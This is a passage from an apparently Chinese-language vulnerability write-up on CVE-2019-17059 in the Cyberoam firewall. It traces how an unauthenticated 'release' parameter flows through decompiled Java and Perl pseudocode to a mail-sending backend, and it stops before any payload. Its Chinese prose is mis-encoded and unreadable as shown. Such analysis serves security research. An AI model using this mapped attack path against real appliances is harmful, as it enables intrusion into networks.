<span class="keyword">if</span> (CheckSession.isSessionExpire(httpServletRequest2)) &#123;</span><br><span class="line">        httpServletResponse.sendRedirect(String.valueOf(httpServletRequest2.getContextPath()) + <span class="string">&quot;/webpages/SessionExpired.jsp&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> (eventByMode.getRequesttype() == <span class="number">1</span>) &#123;</span><br><span class="line">    transactionBean.setTransactionID(CSCClient.getTransactionID());</span><br><span class="line">    CyberoamAjaxHelper.process(httpServletRequest2, httpServletResponse, eventByMode, transactionBean, sqlReader);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (eventByMode.getRequesttype() == <span class="number">2</span>) &#123;</span><br><span class="line">    transactionBean.setTransactionID(CSCClient.getTransactionID());</span><br><span class="line">    CyberoamCustomHelper.process(httpServletRequest2, httpServletResponse, eventByMode, transactionBean, sqlReader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ®µä»£ç ä»ç”¨æˆ·è¯·æ±‚ä¸­è·å– mode å‚æ•°çš„å€¼ï¼Œç„¶åè¿›è¡Œæ•°ä¸ªåˆ¤æ–­ï¼Œé™¤ç‰¹å®šçš„ä¸€äº›å€¼ä»¥å¤–ï¼Œéƒ½éœ€è¦è¿›è¡Œ session éªŒè¯ã€‚</p>
<p>å¦‚æœé€šè¿‡éªŒè¯ï¼Œåˆ™è°ƒç”¨ CyberoamCustomHelper.process å‡½æ•°ï¼Œæ­¤å‡½æ•°é€»è¾‘å¤æ‚ï¼Œç®€å•æ¥è®²ï¼Œå®ƒä¼šè¿›ä¸€æ­¥è§£æç”¨æˆ·æäº¤çš„è¯·æ±‚ï¼Œæ ¹æ® mode å€¼çš„ä¸åŒè¿›è¡Œä¸åŒçš„å¤„ç†ï¼Œä»¥æ— éœ€èº«ä»½éªŒè¯çš„ 458 åŠŸèƒ½ä¸ºä¾‹ï¼Œå®ƒä¼šè°ƒç”¨å‡½æ•° QuarantineDownloadUtility.handleReleaseRequestFromMailï¼Œéƒ¨åˆ†ä»£ç ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">hashMap.put(<span class="string">&quot;release&quot;</span>, paramHttpServletRequest.getParameter(<span class="string">&quot;release&quot;</span>));</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">hashMap.put(<span class="string">&quot;___username&quot;</span>, str2);</span><br><span class="line">hashMap.put(<span class="string">&quot;currentlyloggedinuserip&quot;</span>, paramHttpServletRequest.getHeader(<span class="string">&quot;X-FORWARDED-FOR&quot;</span>));</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">CyberoamLogger.debug(<span class="string">&quot;Spam Mail&quot;</span>, <span class="string">&quot;Calling opcode --&gt; &quot;</span> + eventBean.getOPCode());</span><br><span class="line">i = cSCClient.sendWizardEvent(eventBean, hashMap, paramSqlReader);</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>ä¹‹åä¼šè°ƒç”¨ cSCClient.sendWizardEvent</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">i = send(paramEventBean, jSONObject, paramHttpServletRequest, paramSqlReader);</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œæ¥åˆ°å…³é”®ä½ç½®ï¼Œsend å‡½æ•°å†…éƒ¨ä¼šæ„é€ å‡ºä¹‹å‰æåˆ°çš„ç±» HTTP æ ¼å¼æ•°æ®ï¼Œå¹¶è½¬å‘åˆ° 127.0.0.1 299 ç«¯å£ã€‚</p>
<h3 id="A-2-åç«¯"><a href="#A-2-åç«¯" class="headerlink" title="A.2 åç«¯"></a>A.2 åç«¯</h3><p>æŸ¥çœ‹ç«¯å£å¼€æ”¾ä¿¡æ¯ï¼Œæ‰¾åˆ°ç›‘å¬ 299 çš„æœåŠ¡æ˜¯ csc äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯åŠ¨å‘½ä»¤ä¸º</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">csc -L 3 -c /_conf/csc/csc.conf</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ &#x2F;_conf&#x2F;csc&#x2F; ç›®å½•ä¸‹å¯ä»¥æ‰¾åˆ°å¾ˆå¤š .conf æ–‡ä»¶ï¼Œæ¯ä¸ªæ–‡ä»¶ä¸­éƒ½æ˜¯ä¸€ç§ç±»ä¼¼ perl çš„ä¼ªä»£ç ï¼Œé€šè¿‡ IDA åç¼–è¯‘åˆ†æ csc å‘ç°ç¨‹åºå¼•ç”¨äº†å¤§é‡ perl ç›¸å…³å‡½æ•°</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2019-17059-1.png"
                     
                ></p>
<p>ç»è°ƒæŸ¥ csc å¯èƒ½ä¿®æ”¹äº†åŸå§‹ perlï¼Œè‡ªå·±å®ç°äº†ä¸€å¥—æ–°çš„ perl è§£é‡Šå™¨ï¼Œå¹¶åœ¨å…¶ä¸Šæ·»åŠ äº†æ ¼å¼è§£æç›¸å…³é€»è¾‘ã€‚</p>
<p>å‰ç«¯æ‰€æœ‰åŠŸèƒ½å‘é€åˆ°åç«¯ä¹‹åï¼Œéƒ½ä¼šå…ˆè°ƒç”¨ apiInterface æ¥å£ï¼Œæ­¤æ¥å£åœ¨ perl å±‚é¢å®ç°äº†é‰´æƒã€å‚æ•°è¿‡æ»¤ã€è¯·æ±‚åˆ†å‘ç­‰æ“ä½œã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ tcpdump æˆªè·å‰åç«¯ä¹‹é—´çš„é€šä¿¡æµé‡</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -i lo -A port 299</span><br></pre></td></tr></table></figure></div>

<p>æ ·ä¾‹è¯·æ±‚å’Œå“åº”</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode getCustomerInfo csc/1.2</span><br><span class="line">content-type:json</span><br><span class="line">content-length:118</span><br><span class="line"></span><br><span class="line">&#123;&quot;APIVersion&quot;:&quot;063.051&quot;,&quot;___component&quot;:&quot;LOCAL&quot;,&quot;___username&quot;:&quot;LOCAL&quot;,&quot;mode&quot;:370,&quot;currentlyloggedinuserip&quot;:&quot;127.0.0.1&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">csc/1.2 200 OK</span><br><span class="line">content-length:74</span><br><span class="line"></span><br><span class="line">NULL###NULL###NULL###NULL###NULL###NULL###NULL###NULL###NULL###NULL###NULL</span><br></pre></td></tr></table></figure></div>

<p>ä»¥è¿™ä¸ªè¯·æ±‚ä¸ºä¾‹ï¼Œåœ¨ csc ç›®å½•ä¸‹æœç´¢å­—ç¬¦ä¸² getCustomerInfo å¯ä»¥æ‰¾åˆ°æ­¤åŠŸèƒ½çš„å®šä¹‰</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line">OPCODE getCustomerInfo &#123;</span><br><span class="line">	&lt;code&gt;</span><br><span class="line">		$modulename=$request-&gt;&#123;modulename&#125;;</span><br><span class="line">		$custinfo=<span class="string">&quot;fail&quot;</span>;</span><br><span class="line">	&lt;/code&gt;	</span><br><span class="line">	custinfo=DLOPEN(do_nvram_get,customer.info)		</span><br><span class="line"></span><br><span class="line">	ON_FAIL&#123;</span><br><span class="line">		LOG applog <span class="string">&quot;getCustomerInfo opcode failed\n&quot;</span></span><br><span class="line">		REPLY text <span class="string">&quot;fail&quot;</span> <span class="number">500</span></span><br><span class="line">	&#125;</span><br><span class="line">	REPLY text $custinfo <span class="number">200</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p> å…¶ä½™åŠŸèƒ½çš„è°ƒç”¨ç±»ä¼¼ï¼Œéƒ½æ˜¯ä»¥ç±» HTTP å½¢å¼å‘é€åˆ° 299 ç«¯å£ï¼Œç„¶å csc æ‰¾åˆ°å¯¹åº” perl å‡½æ•°è¿›è¡Œè°ƒç”¨ã€‚</p>
<h3 id="A-3-mode-å®šä¹‰"><a href="#A-3-mode-å®šä¹‰" class="headerlink" title="A.3 mode å®šä¹‰"></a>A.3 mode å®šä¹‰</h3><p>ä»£ç ä¸­æœ‰å¾ˆå¤š modeï¼Œæ¯ä¸ª mode å¯¹åº” perl ä¸­çš„ä¸åŒå‡½æ•°ï¼Œå…·ä½“å®šä¹‰å¯ä»¥åœ¨ java Modes.class ä¸­æ‰¾åˆ°ï¼Œéƒ¨åˆ†å®šä¹‰å¦‚ä¸‹</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">ACCESS_TIME_POLICY_ADD</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">ACCESS_TIME_POLICY_EDIT</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SURFING_QUOTA_POLICY_ADD</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SURFING_QUOTA_POLICY_EDIT</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">NAT_POLICY_ADD</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">NAT_POLICY_EDIT</span> <span class="operator">=</span> <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DATA_TRANSFER_POLICY_ADD</span> <span class="operator">=</span> <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DATA_TRANSFER_POLICY_EDIT</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">ACCESS_TIME_POLICY_DELETE</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">UNICAST_ROUTE_ADD</span> <span class="operator">=</span> <span class="number">11</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">UNICAST_ROUTE_EDIT</span> <span class="operator">=</span> <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">UNICAST_ROUTE_DELETE</span> <span class="operator">=</span> <span class="number">13</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MULTICAST_ROUTE_ADD</span> <span class="operator">=</span> <span class="number">14</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MULTICAST_ROUTE_EDIT</span> <span class="operator">=</span> <span class="number">15</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MULTICAST_ROUTE_DELETE</span> <span class="operator">=</span> <span class="number">16</span>;</span><br></pre></td></tr></table></figure></div>



<h2 id="B-æ¼æ´åˆ†æ"><a href="#B-æ¼æ´åˆ†æ" class="headerlink" title="B. æ¼æ´åˆ†æ"></a>B. æ¼æ´åˆ†æ</h2><p>æ ¹æ®æŠ«éœ²ä¿¡æ¯ï¼Œå­˜åœ¨æ¼æ´çš„åŠŸèƒ½ mode &#x3D; 458ï¼Œåœ¨ mode å®šä¹‰ä¸­æ‰¾åˆ°åŠŸèƒ½åç§°å«åš RELEASE_QUARANTINE_MAIL_FROM_MAILï¼ŒåŒæ—¶åœ¨ CyberoamCommonServlet ç±»ä¸­å¯ä»¥çœ‹åˆ°è¿™ä¸ªåŠŸèƒ½æ— éœ€èº«ä»½éªŒè¯å³å¯è®¿é—®ã€‚</p>
<p>å‰ç«¯ä¸­å¯¹æ­¤åŠŸèƒ½å¤„ç†é€»è¾‘</p>
<ol>
<li>CyberoamCustomHelper</li>
</ol>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (eventBean.getMode() == <span class="number">458</span>) &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">QuarantineDownloadUtility</span>().handleReleaseRequestFromMail(httpServletRequest, httpServletResponse, sqlReader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>QuarantineDownloadUtility</li>
</ol>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleReleaseRequestFromMail</span><span class="params">(HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse, SqlReader paramSqlReader)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">jSONObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">bool</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        str = paramHttpServletRequest.getParameter(<span class="string">&quot;release&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> decode(str);</span><br><span class="line">        String[] arrayOfString1 = str1.split(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">        <span class="type">byte</span> b;</span><br><span class="line">        <span class="type">int</span> j;</span><br><span class="line">        String[] arrayOfString2;</span><br><span class="line">        <span class="keyword">for</span> (j = (arrayOfString2 = arrayOfString1).length, b = <span class="number">0</span>; b &lt; j; ) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> arrayOfString2[b];</span><br><span class="line">            String[] arrayOfString = str2.split(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (arrayOfString.length &gt; <span class="number">2</span>)</span><br><span class="line">                bool = <span class="literal">false</span>; </span><br><span class="line">            jSONObject.put(arrayOfString[<span class="number">0</span>], (arrayOfString.length &gt; <span class="number">1</span>) ? arrayOfString[<span class="number">1</span>] : <span class="string">&quot;&quot;</span>);</span><br><span class="line">            b++;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span> ((jSONObject.getString(<span class="string">&quot;hdnSender&quot;</span>).equals(<span class="string">&quot;&quot;</span>) || validateEmail(jSONObject.getString(<span class="string">&quot;hdnSender&quot;</span>))) &amp;&amp; </span><br><span class="line">            validateEmail(jSONObject.getString(<span class="string">&quot;hdnRecipient&quot;</span>)) &amp;&amp; isSafeFilePath(jSONObject.getString(<span class="string">&quot;hdnFilePath&quot;</span>)) &amp;&amp; </span><br><span class="line">            bool) &#123;</span><br><span class="line">            paramHttpServletResponse.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">            CyberoamLogger.debug(<span class="string">&quot;Antivirus/AntiSpam&quot;</span>, <span class="string">&quot;CSC Constant value &quot;</span> + CSCConstants.isCCC);</span><br><span class="line">            <span class="type">CSCClient</span> <span class="variable">cSCClient</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CSCClient</span>();</span><br><span class="line">            HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">            <span class="type">EventBean</span> <span class="variable">eventBean</span> <span class="operator">=</span> EventBean.getEventByMode(<span class="number">363</span>);</span><br><span class="line">            hashMap.put(<span class="string">&quot;release&quot;</span>, paramHttpServletRequest.getParameter(<span class="string">&quot;release&quot;</span>));</span><br><span class="line">            <span class="keyword">if</span> (paramHttpServletRequest != <span class="literal">null</span>) &#123;</span><br><span class="line">                String str2;</span><br><span class="line">                arrayOfString2 = <span class="literal">null</span>;</span><br><span class="line">                <span class="type">HttpSession</span> <span class="variable">httpSession</span> <span class="operator">=</span> paramHttpServletRequest.getSession(<span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">if</span> (httpSession != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">SessionBean</span> <span class="variable">sessionBean</span> <span class="operator">=</span> (SessionBean)httpSession.getAttribute(<span class="string">&quot;sessionbean&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (sessionBean != <span class="literal">null</span>) &#123;</span><br><span class="line">                        str2 = sessionBean.getUserName();</span><br><span class="line">                        hashMap.put(<span class="string">&quot;___component&quot;</span>, CSCConstants.COMPONENT_VALUE);</span><br><span class="line">                    &#125; </span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">if</span> (str2 == <span class="literal">null</span>)</span><br><span class="line">                    str2 = <span class="string">&quot;-&quot;</span>; </span><br><span class="line">                hashMap.put(<span class="string">&quot;___username&quot;</span>, str2);</span><br><span class="line">                hashMap.put(<span class="string">&quot;currentlyloggedinuserip&quot;</span>, paramHttpServletRequest.getHeader(<span class="string">&quot;X-FORWARDED-FOR&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                hashMap.put(<span class="string">&quot;___username&quot;</span>, <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            &#125; </span><br><span class="line">            CyberoamLogger.debug(<span class="string">&quot;Spam Mail&quot;</span>, <span class="string">&quot;Calling opcode --&gt; &quot;</span> + eventBean.getOPCode());</span><br><span class="line">            i = cSCClient.sendWizardEvent(eventBean, hashMap, paramSqlReader);</span><br><span class="line">            CyberoamLogger.debug(<span class="string">&quot;Spam Mail&quot;</span>, <span class="string">&quot;Status After Call--&gt; &quot;</span> + i);</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">200</span>) &#123;</span><br><span class="line">                i = <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">547</span>) &#123;</span><br><span class="line">                i = -<span class="number">2</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="number">548</span>) &#123;</span><br><span class="line">                i = -<span class="number">3</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                i = -<span class="number">1</span>;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            i = -<span class="number">3</span>;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">        CyberoamLogger.error(<span class="string">&quot;Antivirus/AntiSpam&quot;</span>, <span class="string">&quot;Exception occured while releaseing mail from Spam Quarantined Digest Mail: &quot;</span> + exception, exception);</span><br><span class="line">        i = -<span class="number">1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    CyberoamLogger.debug(<span class="string">&quot;Antivirus/AntiSpam&quot;</span>, <span class="string">&quot;Mail is released  for mode : &quot;</span> + paramHttpServletRequest.getParameter(<span class="string">&quot;mode&quot;</span>));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        paramHttpServletResponse.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> paramHttpServletResponse.getWriter();</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            printWriter.write(<span class="string">&quot;&lt;font&gt;The released email will be scanned and delivered.&lt;/font&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == -<span class="number">2</span>) &#123;</span><br><span class="line">            printWriter.write(<span class="string">&quot;&lt;font&gt;Email has been released or deleted.&lt;/font&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == -<span class="number">3</span>) &#123;</span><br><span class="line">            printWriter.write(<span class="string">&quot;&lt;font&gt;Bad Request.&lt;/font&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            printWriter.write(<span class="string">&quot;&lt;font&gt;Error while releasing email&lt;/font&gt;&quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception exception) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol start="3">
<li>cSCClient.sendWizardEvent å‘é€åˆ° 299 ç«¯å£</li>
</ol>
<p>QuarantineDownloadUtility å‡½æ•°ä¸­ä»è¯·æ±‚ä¸­è·å– release å‚æ•°ï¼Œç„¶åå¯¹å…¶è¿›è¡Œ base64 è§£ç ï¼Œè§£ç åè¿›è¡Œæ•°ä¸ªå‚æ•°åˆ¤æ–­ï¼Œå¦‚æœå…¨éƒ¨é€šè¿‡åˆ™æ‰§è¡Œ</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">EventBean</span> <span class="variable">eventBean</span> <span class="operator">=</span> EventBean.getEventByMode(<span class="number">363</span>);</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œä¼šå°† mode é‡æ–°è®¾ç½®ä¸º 363ï¼Œä»å®šä¹‰ä¸­å¾—çŸ¥ 363 å¯¹åº”æ¥å£åç§°ä¸º SEND_MAILã€‚</p>
<p>ä» perl ä¼ªä»£ç ä¸­æœç´¢èƒ½æ‰¾åˆ° send_mail å‡½æ•°ï¼Œéƒ¨åˆ†ä»£ç ï¼š</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="code"><pre><span class="line">opcode send_mail&#123;</span><br><span class="line">    $reason = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	$strSubject=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	&lt;<span class="regexp">/code&gt;</span></span><br><span class="line"><span class="regexp">	</span></span><br><span class="line"><span class="regexp">	IF(&quot;defined $request-&gt;&#123;release&#125; and $request-&gt;&#123;release&#125; ne &#x27;&#x27; &quot;)&#123;</span></span><br><span class="line"><span class="regexp">		&lt;code&gt;$param = $request-&gt;&#123;release&#125;;&lt;/</span>code&gt;</span><br><span class="line">		param = DLOPEN(base64_decode,param)</span><br><span class="line">		LOG applog <span class="string">&quot; Decode values :: $param \n&quot;</span></span><br><span class="line">		&lt;code&gt;%requestData = <span class="keyword">split</span>(<span class="regexp">/[&amp;=]/</span>, $param);</span><br><span class="line">			$mailServerHost = $requestData<span class="string">&#123;hdnDestDomain&#125;</span>;</span><br><span class="line">			$mailFrom = $requestData<span class="string">&#123;hdnSender&#125;</span>;</span><br><span class="line">			$mailTo   = $requestData<span class="string">&#123;hdnRecipient&#125;</span>;</span><br><span class="line">			$file = $QUARANTINE_PATH.<span class="string">&quot;/&quot;</span>.$requestData<span class="string">&#123;hdnFilePath&#125;</span>;</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">            $mailfile=$requestData<span class="string">&#123;hdnFilePath&#125;</span>;</span><br><span class="line">            $validate_email=<span class="string">&quot;false&quot;</span>;</span><br><span class="line">            <span class="keyword">my</span> $email_regex=<span class="string">&#x27;^([\.]?[_\-\!\#\&#123;\&#125;\$\%\^\&amp;\*\+\=\|\?\&#x27;\\\\\\/a-zA-Z0-9])*@([a-zA-Z0-9]([-]?[a-zA-Z0-9]+)*\.)+([a-zA-Z0-9]&#123;0,6&#125;)$&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>($requestData<span class="string">&#123;hdnRecipient&#125;</span> =~ <span class="regexp">/$email_regex/</span> &amp;&amp; ((<span class="keyword">defined</span> $requestData<span class="string">&#123;hdnSender&#125;</span> &amp;&amp; $requestData<span class="string">&#123;hdnSender&#125;</span> eq <span class="string">&#x27;&#x27;</span>) || $requestData<span class="string">&#123;hdnSender&#125;</span> =~ <span class="regexp">/$email_regex/</span>) &amp;&amp; <span class="keyword">index</span>($requestData<span class="string">&#123;hdnFilePath&#125;</span>,<span class="string">&#x27;../&#x27;</span>) == -<span class="number">1</span>)&#123;</span><br><span class="line">                 $validate_email=<span class="string">&quot;true&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">	&lt;<span class="regexp">/code&gt;</span></span><br><span class="line"><span class="regexp">          IF(&quot;$validate_email eq &#x27;false&#x27;&quot;)&#123;</span></span><br><span class="line"><span class="regexp">             &lt;code&gt;%response=(&quot;status&quot;=&gt;&quot;548&quot;,&quot;statusmessage&quot;=&gt;&quot;Invalid URL&quot;);&lt;/</span>code&gt;</span><br><span class="line">             REPLY  %response <span class="number">500</span></span><br><span class="line">          &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	ELSE&#123;</span><br><span class="line">		<span class="regexp">//</span> ...</span><br><span class="line">	&#125;</span><br><span class="line">	// ...</span><br><span class="line">	LOG applog <span class="string">&quot;Values--&gt;\n&quot;</span></span><br><span class="line">	LOG applog <span class="string">&quot;Mail Server: --&gt; $mailServerHost \n&quot;</span></span><br><span class="line">	LOG applog <span class="string">&quot;File Path: --&gt; $file \n&quot;</span></span><br><span class="line">	LOG applog <span class="string">&quot;Mail From: --&gt; $mailFrom \n&quot;</span></span><br><span class="line">	LOG applog <span class="string">&quot;Mail To: --&gt; $mailTo \n&quot;</span></span><br><span class="line">	LOG applog <span class="string">&quot;Subject: --&gt; $strSubject \n&quot;</span></span><br><span class="line">	IF(<span class="string">&quot; -e $file&quot;</span>)&#123;</span><br><span class="line">	&lt;code&gt;</span><br><span class="line">		$file = $file .<span class="string">&quot;:message/rfc822&quot;</span>;</span><br><span class="line">	%mailreq=(<span class="string">&quot;mailaction&quot;</span>=&gt;<span class="string">&quot;$MAIL_FORWARD&quot;</span>,<span class="string">&quot;subject&quot;</span>=&gt;<span class="string">&quot;$strSubject&quot;</span>,<span class="string">&quot;toEmail&quot;</span>=&gt;<span class="string">&quot;$mailTo&quot;</span>,<span class="string">&quot;attachmentfile&quot;</span>=&gt;<span class="string">&quot;$file&quot;</span>,<span class="string">&quot;smtpserverhost&quot;</span>=&gt;<span class="string">&quot;$mailServerHost&quot;</span>,<span class="string">&quot;fromaddress&quot;</span>=&gt;<span class="string">&quot;$mailFrom&quot;</span>);</span><br><span class="line">	&lt;<span class="regexp">/code&gt;</span></span><br><span class="line"><span class="regexp">	</span></span><br><span class="line"><span class="regexp">        out = OPCODE mail_sender json %mailreq</span></span><br><span class="line"><span class="regexp">        /</span><span class="regexp">/ ...</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">    /</span>/ ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä»£ç ä¸­é¦–å…ˆåˆ¤æ–­ release å‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œç„¶åå¯¹å…¶è¿›è¡Œ base64 è§£ç ï¼Œä»¥ $&#x3D; å°†å­—ç¬¦ä¸²åˆ†å‰²ï¼Œè·å– hdnDestDomainã€hdnSenderã€hdnRecipientã€hdnFilePath å››ä¸ªå‚æ•°å¹¶èµ‹å€¼åˆ°ä¸åŒçš„å˜é‡ã€‚</p>
<p>æ¥ç€åˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤ hdnRecipient å’Œ hdnSender å‚æ•°ï¼ŒéªŒè¯é‚®ç®±æ ¼å¼æ˜¯å¦æ­£ç¡®ï¼Œä¸æ­£ç¡®ç›´æ¥è¿”å› 500 é”™è¯¯ã€‚</p>
